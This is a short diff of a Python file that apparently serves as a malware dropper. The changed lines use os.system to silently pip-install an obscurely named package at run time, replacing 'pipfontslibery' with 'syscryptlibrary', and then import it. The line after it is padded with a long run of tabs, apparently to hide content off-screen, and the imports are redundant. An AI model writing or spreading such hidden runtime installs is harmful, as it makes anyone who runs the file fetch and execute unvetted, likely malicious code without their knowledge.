@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontslibery")
-import pipfontslibery
+os.system("pip install syscryptlibrary")
+import syscryptlibrary
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
